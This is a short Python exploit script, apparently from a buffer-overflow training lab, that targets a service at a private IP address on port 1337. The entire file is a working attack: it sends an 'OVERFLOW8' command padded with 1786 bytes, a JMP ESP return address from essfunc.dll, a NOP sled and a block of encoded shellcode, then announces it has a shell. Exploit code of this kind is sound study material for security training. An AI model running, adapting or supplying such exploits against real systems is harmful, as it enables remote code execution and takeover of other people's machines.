import socket
import sys
import time


print("[+] Nani???? Got a shell!!\n")

buff = "A" * 1786

EIP = "\x03\x12\x50\x62" # 0x62501203 JMP ESP essfunc.dll

nops = "\x90" * 16

shellcode =  b""
shellcode += b"\xd9\xc4\xbb\xa2\xda\x67\xed\xd9\x74\x24\xf4"
shellcode += b"\x5f\x33\xc9\xb1\x52\x31\x5f\x17\x03\x5f\x17"
shellcode += b"\x83\x4d\x26\x85\x18\x6d\x3f\xc8\xe3\x8d\xc0"
shellcode += b"\xad\x6a\x68\xf1\xed\x09\xf9\xa2\xdd\x5a\xaf"
shellcode += b"\x4e\x95\x0f\x5b\xc4\xdb\x87\x6c\x6d\x51\xfe"
shellcode += b"\x43\x6e\xca\xc2\xc2\xec\x11\x17\x24\xcc\xd9"
shellcode += b"\x6a\x25\x09\x07\x86\x77\xc2\x43\x35\x67\x67"
shellcode += b"\x19\x86\x0c\x3b\x8f\x8e\xf1\x8c\xae\xbf\xa4"
shellcode += b"\x87\xe8\x1f\x47\x4b\x81\x29\x5f\x88\xac\xe0"
shellcode += b"\xd4\x7a\x5a\xf3\x3c\xb3\xa3\x58\x01\x7b\x56"
shellcode += b"\xa0\x46\xbc\x89\xd7\xbe\xbe\x34\xe0\x05\xbc"
shellcode += b"\xe2\x65\x9d\x66\x60\xdd\x79\x96\xa5\xb8\x0a"
shellcode += b"\x94\x02\xce\x54\xb9\x95\x03\xef\xc5\x1e\xa2"
shellcode += b"\x3f\x4c\x64\x81\x9b\x14\x3e\xa8\xba\xf0\x91"
shellcode += b"\xd5\xdc\x5a\x4d\x70\x97\x77\x9a\x09\xfa\x1f"
shellcode += b"\x6f\x20\x04\xe0\xe7\x33\x77\xd2\xa8\xef\x1f"
shellcode += b"\x5e\x20\x36\xd8\xa1\x1b\x8e\x76\x5c\xa4\xef"
shellcode += b"\x5f\x9b\xf0\xbf\xf7\x0a\x79\x54\x07\xb2\xac"
shellcode += b"\xfb\x57\x1c\x1f\xbc\x07\xdc\xcf\x54\x4d\xd3"
shellcode += b"\x30\x44\x6e\x39\x59\xef\x95\xaa\xa6\x58\x94"
shellcode += b"\xdb\x4f\x9b\x96\x1a\x2b\x12\x70\x76\x5b\x73"
shellcode += b"\x2b\xef\xc2\xde\xa7\x8e\x0b\xf5\xc2\x91\x80"
shellcode += b"\xfa\x33\x5f\x61\x76\x27\x08\x81\xcd\x15\x9f"
shellcode += b"\x9e\xfb\x31\x43\x0c\x60\xc1\x0a\x2d\x3f\x96"
shellcode += b"\x5b\x83\x36\x72\x76\xba\xe0\x60\x8b\x5a\xca"
shellcode += b"\x20\x50\x9f\xd5\xa9\x15\x9b\xf1\xb9\xe3\x24"
shellcode += b"\xbe\xed\xbb\x72\x68\x5b\x7a\x2d\xda\x35\xd4"
shellcode += b"\x82\xb4\xd1\xa1\xe8\x06\xa7\xad\x24\xf1\x47"
shellcode += b"\x1f\x91\x44\x78\x90\x75\x41\x01\xcc\xe5\xae"
shellcode += b"\xd8\x54\x05\x4d\xc8\xa0\xae\xc8\x99\x08\xb3"
shellcode += b"\xea\x74\x4e\xca\x68\x7c\x2f\x29\x70\xf5\x2a"
shellcode += b"\x75\x36\xe6\x46\xe6\xd3\x08\xf4\x07\xf6"

payload = buff + EIP + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('192.168.1.117', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command
s.send('OVERFLOW8 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()
	
print("[+] Execution Finished")
